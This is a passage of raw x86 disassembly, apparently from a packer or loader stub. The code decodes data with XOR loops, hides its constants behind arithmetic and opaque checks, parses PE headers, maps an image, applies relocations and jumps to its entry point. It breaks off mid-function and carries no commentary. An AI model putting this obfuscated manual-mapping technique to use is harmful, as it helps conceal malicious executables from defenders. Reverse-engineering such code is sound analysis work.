  41e013:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  41e01a:	mov    DWORD PTR [ebp-0x8],edi
  41e01d:	mov    eax,DWORD PTR [ebp-0x54]
  41e020:	xor    eax,ebx
  41e022:	add    eax,esi
  41e024:	jmp    0x41e117
  41e029:	mov    DWORD PTR [ebp-0xac],0xf89c85b3
  41e033:	mov    DWORD PTR [ebp-0x9c],0xf89c85a9
  41e03d:	mov    eax,DWORD PTR [ebp-0x8]
  41e040:	mov    ecx,DWORD PTR [ebp-0x18]
  41e043:	xor    eax,ebx
  41e045:	add    eax,esi
  41e047:	imul   eax,ecx
  41e04a:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e04d:	mov    al,BYTE PTR [eax+ecx*1]
  41e050:	mov    BYTE PTR [ebp-0x1],al
  41e053:	mov    eax,DWORD PTR [ebp-0x8]
  41e056:	mov    ecx,DWORD PTR [ebp-0x18]
  41e059:	xor    eax,ebx
  41e05b:	add    eax,esi
  41e05d:	imul   eax,ecx
  41e060:	mov    ecx,DWORD PTR [ebp-0x4c]
  41e063:	xor    ecx,ebx
  41e065:	add    eax,ecx
  41e067:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e06a:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41e072:	mov    ecx,DWORD PTR [ebp-0xac]
  41e078:	xor    ecx,ebx
  41e07a:	lea    eax,[ecx+eax*1+0x3272e2]
  41e081:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e085:	xor    ecx,eax
  41e087:	mov    BYTE PTR [ebp-0x1],cl
  41e08a:	mov    al,BYTE PTR [ebp-0x1]
  41e08d:	mov    ecx,DWORD PTR [ebp-0x8]
  41e090:	mov    edx,DWORD PTR [ebp-0x18]
  41e093:	xor    ecx,ebx
  41e095:	add    ecx,esi
  41e097:	imul   ecx,edx
  41e09a:	mov    edx,DWORD PTR [ebp-0x1c]
  41e09d:	mov    BYTE PTR [ecx+edx*1],al
  41e0a0:	mov    eax,DWORD PTR [ebp-0x8]
  41e0a3:	mov    ecx,DWORD PTR [ebp-0x18]
  41e0a6:	xor    eax,ebx
  41e0a8:	add    eax,esi
  41e0aa:	imul   eax,ecx
  41e0ad:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e0b0:	mov    al,BYTE PTR [eax+ecx*1]
  41e0b3:	mov    BYTE PTR [ebp-0x1],al
  41e0b6:	mov    eax,DWORD PTR [ebp-0x8]
  41e0b9:	mov    ecx,DWORD PTR [ebp-0x18]
  41e0bc:	xor    eax,ebx
  41e0be:	add    eax,esi
  41e0c0:	imul   eax,ecx
  41e0c3:	mov    ecx,DWORD PTR [ebp-0x10]
  41e0c6:	xor    ecx,ebx
  41e0c8:	add    eax,ecx
  41e0ca:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e0cd:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41e0d5:	mov    ecx,DWORD PTR [ebp-0x9c]
  41e0db:	xor    ecx,ebx
  41e0dd:	lea    eax,[ecx+eax*1+0x3272e2]
  41e0e4:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e0e8:	xor    ecx,eax
  41e0ea:	mov    BYTE PTR [ebp-0x1],cl
  41e0ed:	mov    al,BYTE PTR [ebp-0x1]
  41e0f0:	mov    ecx,DWORD PTR [ebp-0x8]
  41e0f3:	mov    edx,DWORD PTR [ebp-0x18]
  41e0f6:	xor    ecx,ebx
  41e0f8:	add    ecx,esi
  41e0fa:	imul   ecx,edx
  41e0fd:	mov    edx,DWORD PTR [ebp-0x1c]
  41e100:	mov    BYTE PTR [ecx+edx*1],al
  41e103:	mov    eax,DWORD PTR [ebp-0x34]
  41e106:	mov    ecx,DWORD PTR [ebp-0x10]
  41e109:	xor    eax,ebx
  41e10b:	xor    ecx,ebx
  41e10d:	add    eax,esi
  41e10f:	add    ecx,esi
  41e111:	imul   eax,ecx
  41e114:	add    eax,DWORD PTR [ebp-0x18]
  41e117:	mov    DWORD PTR [ebp-0x18],eax
  41e11a:	mov    eax,DWORD PTR [ebp-0x18]
  41e11d:	mov    ecx,DWORD PTR [ebp-0x20]
  41e120:	cmp    ecx,eax
  41e122:	jb     0x41e029
  41e128:	mov    eax,DWORD PTR [ebp-0x10]
  41e12b:	mov    ecx,DWORD PTR [ebp-0x20]
  41e12e:	xor    eax,ebx
  41e130:	add    eax,esi
  41e132:	imul   eax,ecx
  41e135:	mov    ecx,DWORD PTR [ebp-0x54]
  41e138:	xor    ecx,ebx
  41e13a:	add    ecx,esi
  41e13c:	or     eax,ecx
  41e13e:	mov    ecx,DWORD PTR [ebp-0x30]
  41e141:	xor    ecx,ebx
  41e143:	add    eax,ecx
  41e145:	mov    ecx,DWORD PTR [ebp-0x30]
  41e148:	xor    ecx,ebx
  41e14a:	add    eax,ecx
  41e14c:	mov    ecx,DWORD PTR [ebp-0xc]
  41e14f:	lea    eax,[eax+ecx*1+0x64e5c4]
  41e156:	jmp    0x41e167
  41e158:	mov    eax,DWORD PTR [ebp-0x30]
  41e15b:	mov    ecx,DWORD PTR [ebp-0xc]
  41e15e:	xor    eax,ebx
  41e160:	lea    eax,[eax+ecx*1+0x3272e2]
  41e167:	mov    DWORD PTR [ebp-0xc],eax
  41e16a:	mov    eax,DWORD PTR [ebp-0x30]
  41e16d:	xor    eax,ebx
  41e16f:	mov    ecx,0xffcd8d1e
  41e174:	sub    ecx,eax
  41e176:	add    ecx,DWORD PTR [ebp-0x38]
  41e179:	mov    eax,DWORD PTR [ebp-0x30]
  41e17c:	mov    edx,DWORD PTR [ebp-0xc]
  41e17f:	xor    eax,ebx
  41e181:	add    eax,esi
  41e183:	imul   eax,edx
  41e186:	cmp    eax,ecx
  41e188:	jbe    0x41dfa3
  41e18e:	push   DWORD PTR [ebp+0x8]
  41e191:	mov    eax,DWORD PTR [ebp+0x8]
  41e194:	push   DWORD PTR [eax+0x1cc]
  41e19a:	lea    eax,[ebp-0xa0]
  41e1a0:	push   eax
  41e1a1:	mov    eax,DWORD PTR [ebp+0x8]
  41e1a4:	mov    eax,DWORD PTR [eax+0x1c4]
  41e1aa:	push   DWORD PTR [eax]
  41e1ac:	mov    eax,DWORD PTR [ebp+0x8]
  41e1af:	mov    eax,DWORD PTR [eax+0x1c0]
  41e1b5:	push   DWORD PTR [eax]
  41e1b7:	push   DWORD PTR [ebp-0x3c]
  41e1ba:	push   DWORD PTR [ebp-0x2c]
  41e1bd:	call   0x41ec54
  41e1c2:	mov    DWORD PTR [ebp-0x40],eax
  41e1c5:	mov    eax,DWORD PTR [ebp-0x14]
  41e1c8:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e1cb:	xor    eax,ebx
  41e1cd:	add    eax,esi
  41e1cf:	cmp    eax,ecx
  41e1d1:	je     0x41e1f2
  41e1d3:	mov    eax,DWORD PTR [ebp+0x8]
  41e1d6:	mov    ecx,DWORD PTR [ebp-0x50]
  41e1d9:	mov    eax,DWORD PTR [eax+0x1d8]
  41e1df:	xor    ecx,ebx
  41e1e1:	add    ecx,esi
  41e1e3:	push   ecx
  41e1e4:	mov    ecx,DWORD PTR [ebp-0x14]
  41e1e7:	xor    ecx,ebx
  41e1e9:	add    ecx,esi
  41e1eb:	push   ecx
  41e1ec:	push   DWORD PTR [ebp-0x2c]
  41e1ef:	call   DWORD PTR [eax+0x18]
  41e1f2:	pop    edi
  41e1f3:	pop    esi
  41e1f4:	pop    ebx
  41e1f5:	leave  
  41e1f6:	ret    0x4
  41e1f9:	push   ebp
  41e1fa:	mov    ebp,esp
  41e1fc:	push   ecx
  41e1fd:	push   ecx
  41e1fe:	lea    eax,[ebp-0x8]
  41e201:	mov    DWORD PTR [ebp-0x4],eax
  41e204:	push   esi
  41e205:	mov    esi,DWORD PTR [ebp-0x4]
  41e208:	mov    eax,0xf881ba0f
  41e20d:	mov    DWORD PTR [esi],eax
  41e20f:	mov    esi,DWORD PTR [ebp-0x8]
  41e212:	cmp    esi,eax
  41e214:	pop    esi
  41e215:	jne    0x41e21f
  41e217:	mov    BYTE PTR [ecx+0xa],0x7c
  41e21b:	mov    BYTE PTR [edx+0x8],0x2f
  41e21f:	mov    BYTE PTR [edx+0xa],0x7c
  41e223:	mov    BYTE PTR [ecx+0x2],0x2
  41e227:	leave  
  41e228:	ret    
  41e229:	push   ebp
  41e22a:	mov    ebp,esp
  41e22c:	push   ecx
  41e22d:	push   ecx
  41e22e:	lea    eax,[ebp-0x8]
  41e231:	mov    DWORD PTR [ebp-0x4],eax
  41e234:	mov    edx,DWORD PTR [ebp-0x4]
  41e237:	mov    eax,0xf88b0be3
  41e23c:	mov    DWORD PTR [edx],eax
  41e23e:	mov    edx,DWORD PTR [ebp-0x8]
  41e241:	cmp    edx,eax
  41e243:	jne    0x41e254
  41e245:	mov    eax,DWORD PTR [ebp+0x8]
  41e248:	mov    BYTE PTR [ecx+0x9],0x8
  41e24c:	mov    BYTE PTR [eax+0x7],0x47
  41e250:	mov    BYTE PTR [ecx+0x6],0xf
  41e254:	mov    BYTE PTR [ecx+0x3],0x18
  41e258:	leave  
  41e259:	ret    0x4
  41e25c:	push   ebp
  41e25d:	mov    ebp,esp
  41e25f:	push   ecx
  41e260:	push   ecx
  41e261:	lea    eax,[ebp-0x8]
  41e264:	mov    DWORD PTR [ebp-0x4],eax
  41e267:	mov    edx,DWORD PTR [ebp-0x4]
  41e26a:	mov    eax,0x7e0da0f
  41e26f:	mov    DWORD PTR [edx],eax
  41e271:	mov    edx,DWORD PTR [ebp-0x8]
  41e274:	cmp    edx,eax
  41e276:	jne    0x41e27c
  41e278:	mov    BYTE PTR [ecx+0x7],0x47
  41e27c:	mov    eax,DWORD PTR [ebp+0x8]
  41e27f:	mov    BYTE PTR [ecx+0x1],0x5
  41e283:	mov    BYTE PTR [eax+0x9],0x28
  41e287:	leave  
  41e288:	ret    0x4
  41e28b:	push   ebp
  41e28c:	mov    ebp,esp
  41e28e:	push   ecx
  41e28f:	push   ecx
  41e290:	lea    eax,[ebp-0x8]
  41e293:	mov    DWORD PTR [ebp-0x4],eax
  41e296:	push   esi
  41e297:	mov    esi,DWORD PTR [ebp-0x4]
  41e29a:	mov    eax,0x7060e3e
  41e29f:	mov    DWORD PTR [esi],eax
  41e2a1:	mov    esi,DWORD PTR [ebp-0x8]
  41e2a4:	cmp    esi,eax
  41e2a6:	pop    esi
  41e2a7:	jne    0x41e2b3
  41e2a9:	mov    BYTE PTR [edx+0x4],0x3
  41e2ad:	mov    WORD PTR [ecx+0x3],0x318
  41e2b3:	mov    BYTE PTR [edx],0x3f
  41e2b6:	leave  
  41e2b7:	ret    
  41e2b8:	push   ebp
  41e2b9:	mov    ebp,esp
  41e2bb:	push   ecx
  41e2bc:	push   ecx
  41e2bd:	lea    eax,[ebp-0x8]
  41e2c0:	mov    DWORD PTR [ebp-0x4],eax
  41e2c3:	mov    edx,DWORD PTR [ebp-0x4]
  41e2c6:	mov    eax,0xf8870b3f
  41e2cb:	mov    DWORD PTR [edx],eax
  41e2cd:	mov    edx,DWORD PTR [ebp-0x8]
  41e2d0:	cmp    edx,eax
  41e2d2:	jne    0x41e2df
  41e2d4:	mov    eax,DWORD PTR [ebp+0x8]
  41e2d7:	mov    BYTE PTR [ecx+0x8],0xf
  41e2db:	mov    BYTE PTR [eax+0x1],0x5
  41e2df:	mov    BYTE PTR [ecx+0x5],0xb
  41e2e3:	leave  
  41e2e4:	ret    0x4
  41e2e7:	push   esi
  41e2e8:	mov    ecx,edi
  41e2ea:	call   0x41e2b8
  41e2ef:	mov    edx,edi
  41e2f1:	mov    ecx,esi
  41e2f3:	mov    BYTE PTR [esi],0x1f
  41e2f6:	call   0x41e28b
  41e2fb:	push   esi
  41e2fc:	mov    ecx,edi
  41e2fe:	mov    BYTE PTR [esi+0x5],0xb
  41e302:	call   0x41e25c
  41e307:	push   esi
  41e308:	mov    BYTE PTR [esi+0x6],0xf
  41e30c:	call   0x41e229
  41e311:	mov    BYTE PTR [esi+0x2],0x2
  41e315:	mov    edx,esi
  41e317:	jmp    0x41e1f9
  41e31c:	push   ebp
  41e31d:	mov    ebp,esp
  41e31f:	push   ecx
  41e320:	mov    ecx,DWORD PTR [edx+0x194]
  41e326:	push   esi
  41e327:	mov    esi,DWORD PTR [ebp+0x8]
  41e32a:	mov    esi,DWORD PTR [esi]
  41e32c:	mov    DWORD PTR [ecx],esi
  41e32e:	mov    ecx,DWORD PTR [edx+0x194]
  41e334:	mov    ecx,DWORD PTR [ecx]
  41e336:	mov    esi,DWORD PTR [edx+0x190]
  41e33c:	mov    DWORD PTR [esi],ecx
  41e33e:	mov    eax,DWORD PTR [edx+0x194]
  41e344:	mov    ecx,DWORD PTR [eax]
  41e346:	mov    ecx,DWORD PTR [ecx+0x3c]
  41e349:	add    ecx,DWORD PTR [eax]
  41e34b:	mov    DWORD PTR [ebp-0x4],0xf89ca585
  41e352:	mov    eax,DWORD PTR [ebp-0x4]
  41e355:	movzx  ecx,WORD PTR [ecx+0x16]
  41e359:	xor    eax,0x751089b
  41e35e:	add    eax,0x3272e2
  41e363:	pop    esi
  41e364:	test   ecx,eax
  41e366:	je     0x41e374
  41e368:	mov    eax,DWORD PTR [edx+0x1c8]
  41e36e:	mov    DWORD PTR [eax],0xf89c8584
  41e374:	leave  
  41e375:	ret    0x4
  41e378:	push   ebp
  41e379:	mov    ebp,esp
  41e37b:	sub    esp,0x70
  41e37e:	and    DWORD PTR [ebp-0x20],0x0
  41e382:	mov    DWORD PTR [ebp-0x18],0xf89cb585
  41e389:	mov    DWORD PTR [ebp-0x1c],0xf89c85c5
  41e390:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  41e397:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  41e39e:	mov    DWORD PTR [ebp-0x2c],0xf89f0585
  41e3a5:	mov    eax,DWORD PTR [ebp+0x20]
  41e3a8:	mov    eax,DWORD PTR [eax+0x194]
  41e3ae:	mov    DWORD PTR [ebp-0xc],eax
  41e3b1:	mov    eax,DWORD PTR [ebp+0x20]
  41e3b4:	push   ebx
  41e3b5:	push   esi
  41e3b6:	mov    esi,DWORD PTR [eax+0x190]
  41e3bc:	mov    eax,DWORD PTR [ebp+0x20]
  41e3bf:	mov    eax,DWORD PTR [eax+0x18c]
  41e3c5:	mov    DWORD PTR [ebp-0x8],eax
  41e3c8:	mov    eax,DWORD PTR [eax]
  41e3ca:	push   edi
  41e3cb:	mov    DWORD PTR [ebp-0x4],esi
  41e3ce:	test   eax,eax
  41e3d0:	jne    0x41e3dd
  41e3d2:	push   DWORD PTR [ebp+0x1c]
  41e3d5:	mov    edx,DWORD PTR [ebp+0x20]
  41e3d8:	call   0x41e31c
  41e3dd:	mov    eax,DWORD PTR [esi]
  41e3df:	mov    ebx,DWORD PTR [esi]
  41e3e1:	add    ebx,DWORD PTR [eax+0x3c]
  41e3e4:	mov    eax,DWORD PTR [ebp+0xc]
  41e3e7:	mov    ecx,DWORD PTR [ebp-0x8]
  41e3ea:	mov    ecx,DWORD PTR [ecx]
  41e3ec:	mov    esi,0x751089b
  41e3f1:	xor    eax,esi
  41e3f3:	mov    edi,0x3272e2
  41e3f8:	add    eax,edi
  41e3fa:	cmp    eax,ecx
  41e3fc:	jne    0x41e634
  41e402:	mov    eax,DWORD PTR [ebp-0xc]
  41e405:	mov    eax,DWORD PTR [eax]
  41e407:	mov    DWORD PTR [ebp-0x10],eax
  41e40a:	mov    eax,DWORD PTR [ebx+0x50]
  41e40d:	mov    DWORD PTR [ebp-0x68],eax
  41e410:	mov    eax,DWORD PTR [ebp-0x18]
  41e413:	xor    eax,esi
  41e415:	add    eax,edi
  41e417:	mov    DWORD PTR [ebp-0x64],eax
  41e41a:	mov    eax,DWORD PTR [ebp-0x14]
  41e41d:	and    DWORD PTR [ebp-0x6c],0x0
  41e421:	xor    eax,esi
  41e423:	add    eax,edi
  41e425:	mov    DWORD PTR [ebp-0x60],eax
  41e428:	lea    eax,[ebp-0x70]
  41e42b:	push   eax
  41e42c:	mov    eax,DWORD PTR [ebp+0x8]
  41e42f:	xor    eax,esi
  41e431:	add    eax,edi
  41e433:	push   eax
  41e434:	mov    eax,DWORD PTR [ebp+0x20]
  41e437:	add    eax,0xaa
  41e43c:	push   eax
  41e43d:	mov    eax,DWORD PTR [ebp+0x20]
  41e440:	mov    eax,DWORD PTR [eax+0x198]
  41e446:	mov    DWORD PTR [ebp-0x70],0x4
  41e44d:	push   DWORD PTR [eax]
  41e44f:	mov    eax,DWORD PTR [ebp+0x10]
  41e452:	call   eax
  41e454:	mov    ecx,DWORD PTR [ebp-0xc]
  41e457:	mov    ecx,DWORD PTR [ecx]
  41e459:	mov    edx,DWORD PTR [ebp-0x8]
  41e45c:	mov    DWORD PTR [ebp-0x6c],eax
  41e45f:	mov    DWORD PTR [ebp+0x1c],eax
  41e462:	mov    DWORD PTR [edx],ecx
  41e464:	mov    ecx,DWORD PTR [ebp-0x4]
  41e467:	mov    DWORD PTR [ecx],eax
  41e469:	mov    eax,DWORD PTR [ebx+0x50]
  41e46c:	mov    DWORD PTR [ebp-0x68],eax
  41e46f:	mov    eax,DWORD PTR [ebp-0x1c]
  41e472:	xor    eax,esi
  41e474:	add    eax,edi
  41e476:	mov    DWORD PTR [ebp-0x64],eax
  41e479:	lea    eax,[ebp-0x20]
  41e47c:	mov    DWORD PTR [ebp-0x60],eax
  41e47f:	lea    eax,[ebp-0x70]
  41e482:	push   eax
  41e483:	mov    eax,DWORD PTR [ebp+0x8]
  41e486:	xor    eax,esi
  41e488:	add    eax,edi
  41e48a:	push   eax
  41e48b:	mov    eax,DWORD PTR [ebp+0x20]
  41e48e:	add    eax,0xee
  41e493:	push   eax
  41e494:	mov    eax,DWORD PTR [ebp+0x20]
  41e497:	mov    eax,DWORD PTR [eax+0x198]
  41e49d:	mov    DWORD PTR [ebp-0x70],0x4
  41e4a4:	push   DWORD PTR [eax]
  41e4a6:	mov    eax,DWORD PTR [ebp+0x10]
  41e4a9:	call   eax
  41e4ab:	test   eax,eax
  41e4ad:	je     0x41e4d2
  41e4af:	and    DWORD PTR [ebp+0xc],0x0
  41e4b3:	cmp    DWORD PTR [ebx+0x50],0x0
  41e4b7:	jbe    0x41e4d2
  41e4b9:	mov    eax,DWORD PTR [ebp+0x1c]
  41e4bc:	mov    ecx,DWORD PTR [ebp-0x10]
  41e4bf:	sub    ecx,eax
  41e4c1:	mov    dl,BYTE PTR [ecx+eax*1]
  41e4c4:	inc    DWORD PTR [ebp+0xc]
  41e4c7:	mov    BYTE PTR [eax],dl
  41e4c9:	mov    edx,DWORD PTR [ebp+0xc]
  41e4cc:	inc    eax
  41e4cd:	cmp    edx,DWORD PTR [ebx+0x50]
  41e4d0:	jb     0x41e4c1
  41e4d2:	mov    edx,DWORD PTR [ebp+0x1c]
  41e4d5:	mov    ecx,DWORD PTR [edx+0x3c]
  41e4d8:	add    ecx,edx
  41e4da:	mov    eax,DWORD PTR [ecx+0xa0]
  41e4e0:	mov    ebx,DWORD PTR [ecx+0x28]
  41e4e3:	add    eax,edx
  41e4e5:	sub    edx,DWORD PTR [ebp-0x10]
  41e4e8:	add    ebx,DWORD PTR [ebp+0x1c]
  41e4eb:	mov    DWORD PTR [ebp+0xc],edx
  41e4ee:	mov    DWORD PTR [ebp-0x2c],ecx
  41e4f1:	mov    DWORD PTR [ebp-0x14],ebx
  41e4f4:	mov    DWORD PTR [ebp-0x8],0x0
  41e4fb:	jmp    0x41e577
  41e4fd:	add    edx,0xfffffff8
  41e500:	shr    edx,1
  41e502:	mov    DWORD PTR [ebp-0x18],edx
  41e505:	je     0x41e563
  41e507:	lea    edx,[eax+0x8]
  41e50a:	mov    DWORD PTR [ebp-0x4],edx
  41e50d:	mov    edx,DWORD PTR [ebp-0x18]
  41e510:	mov    DWORD PTR [ebp-0x18],edx
  41e513:	mov    edx,DWORD PTR [ebp-0x4]
  41e516:	movzx  edx,WORD PTR [edx]
  41e519:	mov    DWORD PTR [ebp-0x24],edx
  41e51c:	and    edx,0xfff
  41e522:	mov    DWORD PTR [ebp-0x28],edx
  41e525:	mov    edx,DWORD PTR [ebp-0x24]
  41e528:	shr    edx,0xc
  41e52b:	add    edx,0xffcd8d1e
  41e531:	xor    edx,esi
  41e533:	cmp    edx,0xf89c85ba
  41e539:	jne    0x41e55a
  41e53b:	mov    edx,DWORD PTR [ebp-0x28]
  41e53e:	add    edx,DWORD PTR [ebp+0x1c]
  41e541:	mov    ebx,DWORD PTR [eax]
  41e543:	cmp    DWORD PTR [ebx+edx*1],0x0
  41e547:	je     0x41e557
  41e549:	mov    ecx,DWORD PTR [ebp+0xc]
  41e54c:	add    ecx,DWORD PTR [ebx+edx*1]
  41e54f:	mov    ebx,DWORD PTR [eax]
  41e551:	mov    DWORD PTR [edx+ebx*1],ecx
  41e554:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e557:	mov    ebx,DWORD PTR [ebp-0x14]
  41e55a:	add    DWORD PTR [ebp-0x4],0x2
  41e55e:	dec    DWORD PTR [ebp-0x18]
  41e561:	jne    0x41e513
  41e563:	mov    edx,DWORD PTR [ebp-0xc]
  41e566:	add    DWORD PTR [ebp-0x8],edx
  41e569:	mov    edx,DWORD PTR [ebp-0x8]
  41e56c:	cmp    edx,DWORD PTR [ecx+0xa4]
  41e572:	jae    0x41e585
  41e574:	add    eax,DWORD PTR [ebp-0xc]
  41e577:	mov    edx,DWORD PTR [eax+0x4]
  41e57a:	mov    DWORD PTR [ebp-0xc],edx
  41e57d:	test   edx,edx
  41e57f:	jne    0x41e4fd
  41e585:	mov    eax,DWORD PTR [ebp-0x10]
  41e588:	mov    DWORD PTR [ebp-0x6c],eax
  41e58b:	mov    DWORD PTR [ebp-0x70],0x4
  41e592:	mov    eax,DWORD PTR [ecx+0x50]
  41e595:	mov    DWORD PTR [ebp-0x68],eax
  41e598:	mov    eax,DWORD PTR [ebp-0x1c]
  41e59b:	xor    eax,esi
  41e59d:	add    eax,edi
  41e59f:	mov    DWORD PTR [ebp-0x64],eax
  41e5a2:	lea    eax,[ebp-0x20]
  41e5a5:	mov    DWORD PTR [ebp-0x60],eax
  41e5a8:	lea    eax,[ebp-0x70]
  41e5ab:	push   eax
  41e5ac:	mov    eax,DWORD PTR [ebp+0x8]
  41e5af:	xor    eax,esi
  41e5b1:	add    eax,edi
  41e5b3:	push   eax
  41e5b4:	mov    eax,DWORD PTR [ebp+0x20]
  41e5b7:	add    eax,0xee
  41e5bc:	push   eax
  41e5bd:	mov    eax,DWORD PTR [ebp+0x20]
  41e5c0:	mov    eax,DWORD PTR [eax+0x198]
  41e5c6:	push   DWORD PTR [eax]
  41e5c8:	mov    eax,DWORD PTR [ebp+0x10]
  41e5cb:	call   eax
  41e5cd:	mov    eax,DWORD PTR [ebp+0x20]
  41e5d0:	mov    eax,DWORD PTR [eax+0x180]
  41e5d6:	add    eax,DWORD PTR [ebp+0xc]
  41e5d9:	mov    ecx,DWORD PTR [ebp+0xc]
  41e5dc:	push   DWORD PTR [ebp+0x18]
  41e5df:	mov    DWORD PTR [eax],ecx
  41e5e1:	push   DWORD PTR [ebp+0x14]
  41e5e4:	push   DWORD PTR [ebp+0x1c]
  41e5e7:	call   ebx
  41e5e9:	mov    ecx,DWORD PTR [ebp+0xc]
  41e5ec:	add    ecx,DWORD PTR [ebp+0x20]
  41e5ef:	lea    eax,[ebp+0x4]
  41e5f2:	mov    DWORD PTR [ebp+0x20],ecx
  41e5f5:	mov    ecx,DWORD PTR [ebp+0x20]
  41e5f8:	mov    ecx,DWORD PTR [ebp+0x20]
  41e5fb:	mov    edx,DWORD PTR [ecx+0x190]
  41e601:	mov    ecx,DWORD PTR [ebp+0x20]
  41e604:	mov    ecx,DWORD PTR [ecx+0x18c]
  41e60a:	mov    esi,DWORD PTR [ecx]
  41e60c:	cmp    DWORD PTR [eax],esi
  41e60e:	jb     0x41e62f
  41e610:	mov    esi,DWORD PTR [edx]
  41e612:	mov    edi,DWORD PTR [edx]
  41e614:	mov    esi,DWORD PTR [esi+0x3c]
  41e617:	lea    esi,[edi+esi*1+0x50]
  41e61b:	mov    edi,DWORD PTR [ecx]
  41e61d:	add    edi,DWORD PTR [esi]
  41e61f:	cmp    DWORD PTR [eax],edi
  41e621:	jae    0x41e62f
  41e623:	mov    esi,DWORD PTR [ecx]
  41e625:	mov    ecx,DWORD PTR [eax]
  41e627:	mov    edx,DWORD PTR [edx]
  41e629:	sub    ecx,esi
  41e62b:	add    edx,ecx
  41e62d:	mov    DWORD PTR [eax],edx
  41e62f:	mov    eax,DWORD PTR [ebp+0xc]
  41e632:	jmp    0x41e636
  41e634:	xor    eax,eax
  41e636:	pop    edi
  41e637:	pop    esi
  41e638:	pop    ebx
  41e639:	leave  
  41e63a:	ret    0x1c
  41e63d:	push   ebp
  41e63e:	mov    ebp,esp
  41e640:	sub    esp,0x1c
  41e643:	push   esi
  41e644:	mov    esi,eax
  41e646:	mov    eax,DWORD PTR [ecx+0x190]
  41e64c:	cmp    DWORD PTR [eax],0x0
  41e64f:	je     0x41e75f
  41e655:	test   edx,edx
  41e657:	je     0x41e75f
  41e65d:	test   esi,esi
  41e65f:	je     0x41e75f
  41e665:	mov    eax,DWORD PTR [esi+0x88]
  41e66b:	test   eax,eax
  41e66d:	je     0x41e75a
  41e673:	cmp    DWORD PTR [esi+0x8c],0x10
  41e67a:	je     0x41e75a
  41e680:	cmp    DWORD PTR [esi+0x34],edx
  41e683:	je     0x41e75a
  41e689:	mov    esi,DWORD PTR [ecx+0x18c]
  41e68f:	and    DWORD PTR [ebp-0x10],0x0
  41e693:	mov    ecx,edx
  41e695:	sub    ecx,DWORD PTR [esi]
  41e697:	add    eax,edx
  41e699:	movzx  edx,WORD PTR [eax+0xc]
  41e69d:	mov    DWORD PTR [ebp-0x1c],ecx
  41e6a0:	movzx  ecx,WORD PTR [eax+0xe]
  41e6a4:	add    ecx,edx
  41e6a6:	je     0x41e75a
  41e6ac:	lea    ecx,[eax+0x14]
  41e6af:	push   ebx
  41e6b0:	mov    DWORD PTR [ebp-0x18],ecx
  41e6b3:	mov    esi,0x7fffffff
  41e6b8:	push   edi
  41e6b9:	test   DWORD PTR [ecx],esi
  41e6bb:	je     0x41e73c
  41e6bd:	mov    edx,DWORD PTR [ecx]
  41e6bf:	and    DWORD PTR [ebp-0xc],0x0
  41e6c3:	and    edx,esi
  41e6c5:	add    edx,eax
  41e6c7:	movzx  edi,WORD PTR [edx+0xe]
  41e6cb:	movzx  ebx,WORD PTR [edx+0xc]
  41e6cf:	add    edi,ebx
  41e6d1:	je     0x41e73c
  41e6d3:	lea    ecx,[edx+0x14]
  41e6d6:	mov    DWORD PTR [ebp-0x14],ecx
  41e6d9:	test   DWORD PTR [ecx],esi
  41e6db:	je     0x41e71e
  41e6dd:	mov    ecx,DWORD PTR [ecx]
  41e6df:	and    DWORD PTR [ebp-0x8],0x0
  41e6e3:	and    ecx,esi
  41e6e5:	add    ecx,eax
  41e6e7:	movzx  edi,WORD PTR [ecx+0xe]
  41e6eb:	movzx  ebx,WORD PTR [ecx+0xc]
  41e6ef:	add    edi,ebx
  41e6f1:	je     0x41e71e
  41e6f3:	lea    edi,[ecx+0x14]
  41e6f6:	mov    DWORD PTR [ebp-0x4],edi
  41e6f9:	mov    edi,DWORD PTR [ebp-0x4]
  41e6fc:	mov    edi,DWORD PTR [edi]
  41e6fe:	test   edi,edi
  41e700:	je     0x41e708
  41e702:	mov    ebx,DWORD PTR [ebp-0x1c]
  41e705:	add    DWORD PTR [edi+eax*1],ebx
  41e708:	movzx  edi,WORD PTR [ecx+0xe]
  41e70c:	movzx  ebx,WORD PTR [ecx+0xc]
  41e710:	inc    DWORD PTR [ebp-0x8]
  41e713:	add    DWORD PTR [ebp-0x4],0x8
  41e717:	add    edi,ebx
  41e719:	cmp    DWORD PTR [ebp-0x8],edi
  41e71c:	jb     0x41e6f9
  41e71e:	movzx  edi,WORD PTR [edx+0xe]
  41e722:	movzx  ebx,WORD PTR [edx+0xc]
  41e726:	mov    ecx,DWORD PTR [ebp-0x14]
  41e729:	inc    DWORD PTR [ebp-0xc]
  41e72c:	add    ecx,0x8
  41e72f:	add    edi,ebx
  41e731:	mov    DWORD PTR [ebp-0x14],ecx
  41e734:	cmp    DWORD PTR [ebp-0xc],edi
  41e737:	jb     0x41e6d9
  41e739:	mov    ecx,DWORD PTR [ebp-0x18]
  41e73c:	movzx  edx,WORD PTR [eax+0xe]
  41e740:	movzx  edi,WORD PTR [eax+0xc]
  41e744:	inc    DWORD PTR [ebp-0x10]
  41e747:	add    ecx,0x8
  41e74a:	add    edx,edi
  41e74c:	mov    DWORD PTR [ebp-0x18],ecx
  41e74f:	cmp    DWORD PTR [ebp-0x10],edx
  41e752:	jb     0x41e6b9
  41e758:	pop    edi
  41e759:	pop    ebx
  41e75a:	xor    eax,eax
  41e75c:	inc    eax
  41e75d:	jmp    0x41e761
  41e75f:	xor    eax,eax
  41e761:	pop    esi
  41e762:	leave  
  41e763:	ret    
  41e764:	push   ebp
  41e765:	mov    ebp,esp
  41e767:	mov    ecx,DWORD PTR [ecx+0x190]
  41e76d:	mov    eax,DWORD PTR [ebp+0xc]
  41e770:	sub    esp,0x10
  41e773:	push   ebx
  41e774:	xor    ebx,ebx
  41e776:	push   esi
  41e777:	push   edi
  41e778:	cmp    DWORD PTR [ecx],ebx
  41e77a:	je     0x41e802
  41e780:	cmp    eax,ebx
  41e782:	je     0x41e802
  41e784:	cmp    DWORD PTR [eax+0x78],ebx
  41e787:	jne    0x41e78e
  41e789:	xor    eax,eax
  41e78b:	inc    eax
  41e78c:	jmp    0x41e804
  41e78e:	mov    eax,DWORD PTR [eax+0x78]
